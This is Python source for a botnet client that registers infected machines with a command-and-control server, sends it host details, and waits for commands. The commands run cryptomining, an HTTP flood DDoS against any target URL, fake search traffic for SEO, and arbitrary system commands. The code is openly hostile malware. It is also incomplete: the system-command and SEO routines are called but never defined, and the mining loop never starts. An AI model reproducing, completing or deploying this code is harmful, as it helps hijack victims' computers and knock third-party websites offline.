import requests
import json
import time
import socket
import platform
import psutil
import uuid
import threading
import hashlib
import random
import subprocess
import os 

from cryptography.fernet import Fernet

class PythonBot: 
    def __init__(self, c2_server, port=8000):
        self.c2_server = c2_server
        self.port = port 
        self.base_url = f'http://{c2_server}:{port}/api'
        self.running = True
        self.capabilities = { 
            'mining': True,
            'ddos': True,
            'seo': True,
            'data_collection': True,
            'system_comands': True
        }
        self.session = requests.Session()
        self.bot_id = self.generate_bot_id()
        
        #Encryption
        self.encryption_key = b'IptksQT0gmh5RL3CJHLQ6fKsAOv91KR637WA8QJjoDo='
        self.fernet = Fernet(self.encryption_key)

    def generate_bot_id(self):
        hostname = socket.gethostname()
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 8*6, 8)[::-1]])
        print('hostname:', hostname, 'mac :', mac)
        return f'pybot-{hostname}-{mac}'

    def get_system_info(self):
        try :
            system_info = {
                'bot_type': 'python',
                'bot_id': self.bot_id,
                'host_name': socket.gethostname(),
                'ip_address': socket.gethostbyname(socket.gethostname()),
                'platform': platform.system().lower(),
                'architecture': platform.architecture()[0],
                'username': psutil.users()[0].name if psutil.users() else 'Unknown',
                'priveleges': 'admin' if os.name == 'nt' else 'root' if os.geteuid() == 0 else 'user',
                'version': '1.0.0',
                'cpu_cores': psutil.cpu_count(),
                'memeory_size': psutil.virtual_memory().total,
                'disk_space': psutil.disk_usage('/').total,
                'internal_ip': self.get_internal_ip(),
                'mac_address': ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 8*6, 8)][::-1]),
                'metadata': {
                    'boot_time': psutil.boot_time(),
                    'process_count': len(psutil.pids()),
                    'python_version': platform.python_version()
                },
                'capabilities': self.capabilities

            }
            print(system_info)
            return system_info
        except Exception as e:
            print(f'Error collecting system info: ', e)
            return {}
        
    def get_internal_ip(self): 
        try: 
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return  '127.0.0.1'
    def register_with_c2(self):
        seystem_info = self.get_system_info()
        try:
            response = self.session.post(
                f'{self.base_url}/bots/register/',
                json=seystem_info,
                timeout=10
            )
            if response.status_code == 200:
                print("Successfully registered with c2 server")
                return True
        except Exception as e:
            print(f"Registration failed : {e}")
        return False
    
    def check_for_commands(self):
        try:
            response = self.session.get(
                f'{self.base_url}/commands/pending/?bot_id={self.bot_id}',
                timeout=10
            )
            if response.status_code == 200:
                commands = response.json()
                return commands
        except Exception as e:
            print(f"Error checking commands: {e}")
        return []

    def execute_command(self, command):
        command_id = command['id']
        command_name = command['command_name']
        parameters = command.get('parameters', {})

        try: 
            #Update command status to executing
            self.session.post(
                f'{self.base_url}/commands/{command_id}/update_status/',
                json={ 'command_id': command_id, 'status': 'executing'}
            )

            #Executing the command based on type 
            if command['command_type'] == 'mining':
                output, error, exit_code = self.execute_mining_command(command_name, parameters)
            elif command['command_type'] == 'ddos':
                output, error, exit_code = self.execute_ddos_command(command_name, parameters)
            elif command['command_type'] == 'seo':
                output, error, exit_code = self.execute_seo_command(command_name, parameters)            
            else:
                output, error, exit_code = self.execute_system_command(command_name, parameters)

            self.session.post(
                f"{self.base_url}/commands/{command_id}/update_status/",
                json={
                    'command_id': command_id,
                    'output': output,
                    'error': error,
                    'exit_code': exit_code
                }
            )

        except Exception as e:
            print(f'Error executing command: {e}')
            pass

    def execute_mining_command(self, command_name, parameters):
        if command_name == 'start_mining':
            algorithm = parameters.get('algorithm', 'cryptonight')
            intensity = parameters.get('intensity', 50)

            #start mining in background thread
            thread = threading.Thread(target=self.start_mining, args=(algorithm, intensity))
            thread.daemon = True
            thread.start()
            return f'Mining started with algorithm { algorithm} , intensity {intensity}', '', 0
        elif command_name == 'stop_mining':
            self.stop_mining()
            return "Mining stopped", "", 0

        else:
            return '', f'Unknown mining command: { command_name}', 1

    def start_mining(self, algorithm, intensity):
        print(f"Starting mining with {algorithm} at intensity {intensity}")
        target_hash =  '0000'
        nonce = 0

        while hasattr(self, 'mining_active') and self.mining_active:
            data = f"{self.bot_id}{nonce}{random.randint(0, 1000000)}"
            hash_result = hashlib.sha256(data.encode()).hexdigest()

            if hash_result.startswith(target_hash):
                print(f'Found block: {hash_result}')
            
            nonce += 1
            time.sleep(1 / intensity)

    def stop_mining(self):
        self.mining_active = False
        print('Mining stopped')

    def execute_ddos_command(self, command_name, parameters):
        if command_name == 'start_ddos':
            target_url = parameters.get('target_url')
            duration = parameters.get('duration', 60)
            threads = parameters.get('threads', 20)

            thread = threading.Thread(target=self.start_ddos, args=(target_url, duration, threads))

            thread.daemon = True
            thread.start()

            return f"DDoS started against {target_url} for {duration} seconds", "", 0
        elif command_name == 'stop_ddos':
            self.stop_ddos()
            return 'DDoS stopped', '', 0
        else:
            return "", f"Uknown DDoS command: {command_name}", 1

    def start_ddos(self, target_url ,duration, threads):
        print(f'Starting DDoS against: {target_url}')
        end_time = time.time() + duration
        
        def attack_worker():
            session = requests.Session()
            while time.time() < end_time and hasattr(self, 'ddos_active') and self.ddos_active:
                try:
                    session.get(target_url, timeout=5)
                    session.post(target_url, data={'hello server': 'ddos'}, timeout=5)
                except:
                    pass

        self.ddos_active = True
        workers = []
        for i in range(threads):
            worker = threading.Thread(target=attack_worker)
            worker.daemon = True
            worker.start()
            workers.append(worker)
        
        #waiting for duration or until stopped
        while time.time() < end_time and self.ddos_active:
            time.sleep(1)
        
        self.ddos_active = False
        print('DDoS attack completed')

    def stop_ddos(self):
        self.ddos_active = False
        print("DDoS stopped")

    def execute_seo_command(self, command_name, parameters):
        if command_name == 'start_seo_boost':
            keyword = parameters.get('keyword')
            search_engine = parameters.get('search_engine', 'google')
            searches_count  = parameters.get('searches_count', 70)

            thread = threading.Thread(target=self.start_seo_boost, args=(keyword, search_engine, searches_count))
            thread.daemon = True
            thread.start()

            return f'SEO boost started for "{keyword}" on {search_engine}'
        else:
            return f"Unknown SEO {command_name}"

if __name__ == '__main__':
    bot = PythonBot('kenya')
    bot.generate_bot_id()
    bot.get_system_info()